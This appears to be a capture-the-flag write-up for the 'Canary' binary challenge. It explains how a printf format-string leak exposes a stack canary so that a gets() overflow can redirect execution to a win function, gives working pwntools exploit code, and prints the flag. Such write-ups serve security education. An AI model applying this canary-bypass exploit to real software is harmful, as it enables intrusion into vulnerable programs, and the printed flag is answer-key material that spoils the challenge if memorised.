# Canary
## Binary, 70 pts.

#### Description
A tear rolled down her face like a tractor. “David,” she said tearfully, “I don’t want to be a farmer no more.”

—Anonymous

Can you call the flag function in this program (source)? Try it out on the shell server at /problems/2020/canary or by connecting with `nc shell.actf.co 20701`.

Author: kmh

#### Hint
That printf call looks dangerous too...

### Writeup
#### Analysis
At lines 39 and 44 we can see 2 calls to "gets", an unsafe function which allows us to overflow the buffer.<br>
However, the binary has canaries. Canaries are an integer on the stack which is set at the beginning of the function. Before exiting the function, the program checks if they have been corrupted. If they have, the program is killed. That means we cannot just overflow the buffer and set a return address. However, in this program we can leak the canary thanks to the `printf format string attack`.

```C
char name[20];
gets(name);
printf("Nice to meet you, ");
printf(strcat(name, "!\n"));
printf("Anything else you want to tell me? ");
char info[50];
gets(info);
```

The first string (name) is passed to printf. We can use this to leak the canary. Then, with the second gets, we overflow the buffer, keeping the canary with the same value. Our overflow will not trigger the stack smashing check snymore and we will be able to redirect the program's flow.

#### Leaking the Canary
Our first string should be like `%N$p' where N is the position of the canary on the stack. How to find N? Here's a really lazy way to do it:

```Python
for x in range(1, 20):
    p = process('./canary')
    p.sendline('%{}$p'.format(x))
    p.recvuntil('Nice')
    print(x)
    print p.recvline()
    p.close()
```

Run this multiple times and analyze the output. You're looking for an integer which seems to be quite random every time. In this program, I found N to be 17.


#### Redirecting program flow
Now, let's redirect program flow. First, use radare2 or IDA or similar to find out the size of the buffer and the address of the win function.<br>
The win function is at 0x400787.<br>
The string starts at RBP - 0x40. At RBP - 0x8 we find the canary, and at RBP + 8 we find the return address. Let's craft our overflow accordingly.<br>

```Python
p.sendline('%{}$p'.format(17).encode('ascii'))
p.recvuntil(b'Nice to meet you, ')
canary = int(p.recvuntil(b'!')[:-1].decode('ascii'), 16)
print('Canary: {}'.format(hex(canary)))

exploit = b'a' * (0x40 - 0x8) + p64(canary) + b'a' * 8 + p64(win_func)
p.sendline(exploit)
print(p.recvall().decode('ascii'))
```

### Flag
`actf{youre_a_canary_killer_>:(}`
